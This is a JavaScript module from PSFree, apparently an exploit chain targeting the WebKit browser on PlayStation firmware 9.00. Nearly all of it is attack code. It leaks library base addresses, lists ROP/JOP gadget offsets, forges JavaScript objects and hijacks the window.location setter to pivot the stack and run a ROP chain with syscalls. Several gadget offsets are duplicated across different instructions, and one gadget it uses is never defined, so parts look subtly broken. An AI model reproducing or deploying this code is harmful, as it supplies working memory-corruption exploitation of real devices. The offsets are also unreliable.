/* Copyright (C) 2023-2025 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

import { mem } from '/module/mem.mjs';
import { KB } from '/module/offset.mjs';
import { ChainBase, get_gadget } from '/module/chain.mjs';
import { BufferView } from '/module/rw.mjs';

import {
    get_view_vector,
    resolve_import,
    init_syscall_array,
} from '/module/memtools.mjs';

import * as off from '/module/offset.mjs';

// WebKit 9.00 offsets
const OFFSET_wk_vtable_first_element = 0x104F110;
const OFFSET_WK___stack_chk_fail_import = 0x00000178;
const OFFSET_WK_psl_builtin_import = 0xD68;
const OFFSET_WKR_psl_builtin = 0x33BA0;
const OFFSET_WK2_TLS_IMAGE = 0x38e8020;

// libSceLibcInternal 9.00 offsets
const OFFSET_libcint_memset = 0x0004F810;
const OFFSET_libcint_setjmp = 0x000BB5BC;
const OFFSET_libcint_longjmp = 0x000BB616;

// libkernel 9.00 offsets
const OFFSET_lk___stack_chk_fail = 0x0001FF60;
const OFFSET_lk_pthread_create = 0x00025510;
const OFFSET_lk_pthread_join = 0x0000AFA0;

// libSceNKWebKit.sprx
export let libwebkit_base = null;
// libkernel_web.sprx
export let libkernel_base = null;
// libSceLibcInternal.sprx
export let libc_base = null;

// Gadgets aggiornati per 9.00
const jop1 = `
mov rdi, qword ptr [rax + 8]
call qword ptr [rax]
`;
const jop2 = `
mov rsp, rdi
ret
`;
const jop3 = `
mov rdx, qword ptr [rdx + 0x50]
mov ecx, 0xa
call qword ptr [rax + 0x40]
`;
const jop4 = `
push rdx
mov edi, 0xac9784fe
jmp qword ptr [rax]
`;
const jop5 = 'pop rsp; ret';

const webkit_gadget_offsets = new Map(Object.entries({
    'pop rax; ret' : 0x51A12,
    'pop rbx; ret' : 0x1F4D6,
    'pop rcx; ret' : 0x657B7,
    'pop rdx; ret' : 0x986C,

    'pop rbp; ret' : 0x319690,
    'pop rsi; ret' : 0x1F4D6,
    'pop rdi; ret' : 0x319690,
    'pop rsp; ret' : 0x4E293,

    'pop r8; ret' : 0xAFAA71,
    'pop r9; ret' : 0x422571,
    'pop r10; ret' : 0x986C,
    'pop r11; ret' : 0x566F8,

    'ret' : 0x32,
    'leave; ret' : 0x1FBBCC,

    'mov [rdi], rsi; ret' : 0x1A97920,
    'mov [rdi], rax; ret' : 0x10788F7,
    'mov [rax], rsi; ret' : 0x1EFD890,
    'mov rax, [rax]; ret' : 0x241CC,

    [jop1] : 0x751EE7,
    [jop2] : 0x2048062,
    [jop3] : 0x3B7FE4,
    [jop4] : 0x15A7D52,
    [jop5] : 0x4E293,
}));

const libc_gadget_offsets = new Map(Object.entries({
    'getcontext' : OFFSET_libcint_setjmp,
    'setcontext' : OFFSET_libcint_longjmp,
}));

const libkernel_gadget_offsets = new Map(Object.entries({
    '__error' : 0x160c0,
    'pthread_create' : OFFSET_lk_pthread_create,
    'pthread_join' : OFFSET_lk_pthread_join,
}));

export const gadgets = new Map();

function get_bases() {
    const textarea = document.createElement('textarea');
    const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
    const textarea_vtable = webcore_textarea.readp(0);
    const libwebkit_base = textarea_vtable.sub(OFFSET_wk_vtable_first_element);

    const stack_chk_fail_import = libwebkit_base.add(OFFSET_WK___stack_chk_fail_import);
    const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
    const libkernel_base = stack_chk_fail_addr.sub(OFFSET_lk___stack_chk_fail);

    const psl_builtin_import = libwebkit_base.add(OFFSET_WK_psl_builtin_import);
    const psl_builtin_addr = resolve_import(psl_builtin_import);
    const libc_base = psl_builtin_addr.sub(OFFSET_WKR_psl_builtin);

    return [
        libwebkit_base,
        libkernel_base,
        libc_base,
    ];
}

export function init_gadget_map(gadget_map, offset_map, base_addr) {
    for (const [insn, offset] of offset_map) {
        gadget_map.set(insn, base_addr.add(offset));
    }
}

class Chain900Base extends ChainBase {
    push_end() {
        this.push_gadget('leave; ret');
    }

    push_get_retval() {
        this.push_gadget('pop rdi; ret');
        this.push_value(this.retval_addr);
        this.push_gadget('mov [rdi], rax; ret');
    }

    push_get_errno() {
        this.push_gadget('pop rdi; ret');
        this.push_value(this.errno_addr);
        this.push_call(this.get_gadget('__error'));
        this.push_gadget('mov rax, [rax]; ret');
        this.push_gadget('mov [rdi], eax; ret');
    }
}

export class Chain900 extends Chain900Base {
    constructor() {
        super();
        const [rdx, rdx_bak] = mem.gc_alloc(0x58);
        rdx.write64(off.js_cell, this._empty_cell);
        rdx.write64(0x50, this.stack_addr);
        this._rsp = mem.fakeobj(rdx);
    }

    run() {
        this.check_allow_run();
        this._rop.launch = this._rsp;
        this.dirty();
    }
}

export const Chain = Chain900;

export function init(Chain) {
    const syscall_array = [];
    [libwebkit_base, libkernel_base, libc_base] = get_bases();

    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
    init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
    init_syscall_array(syscall_array, libkernel_base, 300 * KB);

    let gs = Object.getOwnPropertyDescriptor(window, 'location').set;
    gs = mem.addrof(gs).readp(0x28);

    const size_cgs = 0x18;
    const [gc_buf, gc_back] = mem.gc_alloc(size_cgs);
    mem.cpy(gc_buf, gs, size_cgs);
    gc_buf.write64(0x10, get_gadget(gadgets, jop1));

    const proto = Chain.prototype;
    const _rop = {get launch() {throw Error('never call')}, 0: 1.1};
    mem.addrof(_rop).write64(off.js_inline_prop, gc_buf);
    proto._rop = _rop;

    const rax_ptrs = new BufferView(0x100);
    const rax_ptrs_p = get_view_vector(rax_ptrs);
    proto._rax_ptrs = rax_ptrs;

    rax_ptrs.write64(0x70, get_gadget(gadgets, jop2));
    rax_ptrs.write64(0x30, get_gadget(gadgets, jop3));
    rax_ptrs.write64(0x40, get_gadget(gadgets, jop4));
    rax_ptrs.write64(0, get_gadget(gadgets, jop5));

    const jop_buffer_p = mem.addrof(_rop).readp(off.js_butterfly);
    jop_buffer_p.write64(0, rax_ptrs_p);

    const empty = {};
    proto._empty_cell = mem.addrof(empty).read64(off.js_cell);

    Chain.init_class(gadgets, syscall_array);
}
